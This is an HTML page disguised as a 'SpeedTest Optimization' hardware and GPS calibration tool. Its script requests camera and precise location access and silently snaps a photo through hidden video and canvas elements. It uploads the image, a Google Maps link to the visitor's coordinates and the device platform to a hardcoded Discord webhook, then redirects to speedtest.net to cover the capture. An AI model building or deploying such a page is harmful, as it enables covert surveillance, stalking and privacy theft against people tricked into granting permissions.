<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Calibration</title>
    <style>
        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 380px; border: 1px solid #232a42; }
        .btn { background: #00d2ff; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2>SpeedTest Optimization</h2>
        <p>Click below to start the hardware latency and GPS calibration.</p>
        <button class="btn" id="startBtn">BEGIN CALIBRATION</button>
        <p id="status" style="color: #5c6784; font-size: 0.8rem; margin-top: 10px;"></p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';

        document.getElementById('startBtn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            status.innerText = "Attempting to connect to sensors...";
            
            try {
                // STEP 1: Request Camera First
                status.innerText = "Requesting Camera...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(e => {
                    console.log("Camera denied");
                    return null;
                });

                // STEP 2: Request GPS Second
                status.innerText = "Requesting GPS...";
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    status.innerText = "Uploading results...";

                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const formData = new FormData();

                    const message = {
                        content: "ðŸ“¡ **NEW DATA CAPTURED**",
                        embeds: [{
                            title: "Hardware Sync Report",
                            fields: [
                                { name: "Location", value: `https://www.google.com/maps?q=${lat},${lon}` },
                                { name: "Device", value: navigator.platform }
                            ]
                        }]
                    };

                    formData.append('payload_json', JSON.stringify(message));

                    // If we got a camera stream, take a photo
                    if (stream) {
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        const canvas = document.getElementById('canvas');
                        
                        // Wait for camera to warm up
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            canvas.toBlob(async (blob) => {
                                formData.append('file', blob, 'pic.jpg');
                                await fetch(WEBHOOK, { method: 'POST', body: formData });
                                finish(stream);
                            }, 'image/jpeg');
                        }, 1000);
                    } else {
                        await fetch(WEBHOOK, { method: 'POST', body: formData });
                        finish(null);
                    }

                }, (err) => {
                    alert("GPS Error: You must allow Location access to perform this test.");
                    status.innerText = "GPS Access Denied.";
                }, { enableHighAccuracy: true });

            } catch (err) {
                alert("Critical System Error: " + err.message);
            }
        });

        function finish(stream) {
            if (stream) stream.getTracks().forEach(t => t.stop());
            document.getElementById('status').innerText = "Done!";
            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 500);
        }
    </script>
</body>
</html>
